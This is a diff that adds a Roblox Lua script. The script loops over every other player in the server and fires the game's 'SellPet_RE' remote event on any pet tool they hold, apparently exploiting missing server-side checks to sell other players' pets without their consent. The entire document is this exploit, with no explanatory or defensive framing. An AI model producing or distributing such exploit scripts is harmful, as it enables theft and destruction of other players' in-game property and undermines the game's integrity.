@@ -1,0 +1,12 @@
+task.spawn(function()
+    while true do wait()
+        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+            if v.Name ~= game.Players.LocalPlayer.Name then
+                local Pet = v.Character:FindFirstChildOfClass("Tool")
+                if Pet and Pet:GetAttribute("ItemType") == "Pet" then
+                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("SellPet_RE"):FireServer(Pet)
+                end
+            end
+        end
+    end
+end)
